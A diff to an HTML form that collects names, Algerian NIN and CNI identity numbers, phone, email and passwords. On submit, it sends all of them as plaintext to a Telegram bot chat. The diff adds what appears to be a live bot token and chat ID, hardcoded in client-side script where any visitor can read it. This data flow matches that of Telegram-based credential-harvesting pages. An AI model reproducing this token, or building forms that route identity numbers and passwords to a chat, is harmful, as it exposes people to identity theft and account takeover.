@@ -9,6 +9,11 @@
         form { background: #fff; padding: 20px; border-radius: 8px; max-width: 400px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: flex; flex-direction: column; gap: 15px; margin: auto; }
         h3 { margin-top: 0; text-align: center; color: #333; }
         input, select, button { padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        
+        /* Highlight invalid fields slightly when the user is typing */
+        input:focus:invalid { border-color: #e74c3c; outline: none; box-shadow: 0 0 5px rgba(231, 76, 60, 0.5); }
+        input:focus:valid { border-color: #2ecc71; outline: none; box-shadow: 0 0 5px rgba(46, 204, 113, 0.5); }
+
         button { background-color: #0088cc; color: white; cursor: pointer; border: none; font-weight: bold; transition: background-color 0.2s; }
         button:hover { background-color: #006699; }
         button:disabled { background-color: #cccccc; cursor: not-allowed; }
@@ -20,11 +25,24 @@
         <h3>Add User Data</h3>
         
         <input type="text" id="name" placeholder="Name (e.g., Mounir)" required>
-        <input type="text" id="nin" placeholder="NIN" required>
-        <input type="text" id="cni" placeholder="CNI" required>
-        <input type="tel" id="phone" placeholder="Phone (e.g., 0661232740)" required>
+        
+        <input type="text" id="nin" placeholder="NIN (18 digits)" 
+               required pattern="[0-9]{18}" maxlength="18" 
+               title="NIN must be exactly 18 digits.">
+               
+        <input type="text" id="cni" placeholder="CNI (9 digits)" 
+               required pattern="[0-9]{9}" maxlength="9" 
+               title="CNI must be exactly 9 digits.">
+               
+        <input type="tel" id="phone" placeholder="Phone (e.g., 0661232740)" 
+               required pattern="0[567][0-9]{8}" maxlength="10" 
+               title="Phone must be exactly 10 digits and start with 05, 06, or 07.">
+               
         <input type="email" id="email" placeholder="Email" required>
-        <input type="password" id="password" placeholder="Password" required>
+        
+        <input type="password" id="password" placeholder="Password" 
+               required pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=])[^\s]{8,}$" 
+               title="Password must be at least 8 characters, include an uppercase letter, a lowercase letter, a digit, one symbol (@#$%^&+=), and no spaces.">
 
         <!-- Wilaya Dropdown -->
         <select id="wilaya_code" required>
@@ -101,8 +119,8 @@
         // ==========================================
         // ⚠️ EDIT THESE TWO VARIABLES BEFORE DEPLOYING
         // ==========================================
-        const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; 
-        const CHAT_ID = 'YOUR_CHAT_ID';
+        const BOT_TOKEN = '8739703950:AAGxXnHSSKZR6JLETNHC-LWMd9xzWMK2yPA'; 
+        const CHAT_ID = '1892066815';
         // ==========================================
 
         const wilayaSelect = document.getElementById('wilaya_code');
@@ -110,11 +128,10 @@
         const form = document.getElementById('dataForm');
         const submitBtn = document.getElementById('submitBtn');
 
-        // 1. Fetch Communes from LOCAL GitHub folder
+        // Fetch Communes from LOCAL GitHub folder
         wilayaSelect.addEventListener('change', async (e) => {
             const wilayaCode = e.target.value;
             
-            // Reset Commune Dropdown
             communeSelect.innerHTML = '<option value="">Loading...</option>';
             communeSelect.disabled = true;
             submitBtn.disabled = true;
@@ -125,10 +142,7 @@
             }
 
             try {
-                // Convert "01" to "1" to match your downloaded JSON file names (1.json, 2.json, etc.)
                 const localFileId = parseInt(wilayaCode, 10);
-                
-                // Fetch directly from the "communes" folder on your GitHub Pages repo
                 const localUrl = `./communes/${localFileId}.json`;
                 
                 const response = await fetch(localUrl);
@@ -137,12 +151,11 @@
                 
                 const communes = await response.json();
 
-                // Clear "Loading..." and populate
                 communeSelect.innerHTML = '<option value="">Select Commune...</option>';
                 
                 communes.forEach(commune => {
                     const option = document.createElement('option');
-                    option.value = commune.code; // Sets the value to the code (e.g., "3524")
+                    option.value = commune.code; 
                     option.textContent = `${commune.code} - ${commune.name}`; 
                     communeSelect.appendChild(option);
                 });
@@ -152,18 +165,20 @@
             } catch (error) {
                 console.error("Failed to load local communes:", error);
                 communeSelect.innerHTML = '<option value="">Error loading data</option>';
-                alert("Could not load commune data. Make sure you uploaded the 'communes' folder containing the JSON files to your GitHub repository.");
+                alert("Could not load commune data. Make sure the 'communes' folder is uploaded.");
             }
         });
 
-        // 2. Handle Form Submission & Send to Telegram
+        // Handle Form Submission & Send to Telegram
         form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+            // e.preventDefault() prevents the page from refreshing. 
+            // Because it's attached to the 'submit' event, the browser will have ALREADY 
+            // checked our regex patterns and blocked the submission if any are wrong!
+            e.preventDefault(); 
             
             submitBtn.disabled = true;
             submitBtn.textContent = 'Sending...';
 
-            // Extract values
             const nin = document.getElementById('nin').value.trim();
             const cni = document.getElementById('cni').value.trim();
             const phone = document.getElementById('phone').value.trim();
@@ -172,19 +187,13 @@
             const wilaya_code = document.getElementById('wilaya_code').value.trim();
             const commune_code = document.getElementById('commune_code').value.trim();
 
-            // Concatenate command: /add nin|cni|phone|email|password|wilaya_code|commune_code
             const commandString = `/add ${nin}|${cni}|${phone}|${email}|${password}|${wilaya_code}|${commune_code}`;
 
             try {
                 const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: commandString
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: commandString })
                 });
 
                 if (tgResponse.ok) {
